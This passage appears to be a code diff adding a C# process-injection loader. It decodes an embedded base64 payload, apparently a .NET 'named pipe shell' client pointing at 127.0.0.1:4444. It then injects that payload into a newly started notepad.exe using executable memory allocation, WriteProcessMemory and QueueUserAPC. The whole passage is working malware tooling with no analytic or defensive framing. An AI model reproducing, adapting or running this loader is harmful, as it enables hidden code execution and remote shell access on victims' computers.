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AGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEfAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAWAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAADoACQABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABtAHkAYwBsAGkAZQBuAHQAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAADoADQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAbQB5AGMAbABpAGUAbgB0AC4AZQB4AGUAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMQAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAQgANAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAG0AeQBjAGwAaQBlAG4AdAAuAGUAeABlAAAAAAAyAAkAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAG0AeQBjAGwAaQBlAG4AdAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAvGMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
+
+                byte[] shellcode = new byte[] { };
+                shellcode = Convert.FromBase64String(b64);
+
+                uint lpNumberOfBytesWritten = 0;
+
+                PROCESS_INFORMATION processInfo = StartProcess("C:/Windows/System32/notepad.exe");
+
+                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)processInfo.dwProcessId);
+
+                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+
+                if (WriteProcessMemory(pHandle, rMemAddress, shellcode, (uint)shellcode.Length, ref lpNumberOfBytesWritten))
+                {
+
+                    IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
+
+                    IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
+
+                    ResumeThread(tHandle);
+
+                }
+                bool hOpenProcessClose = CloseHandle(pHandle);
+            }
+        }
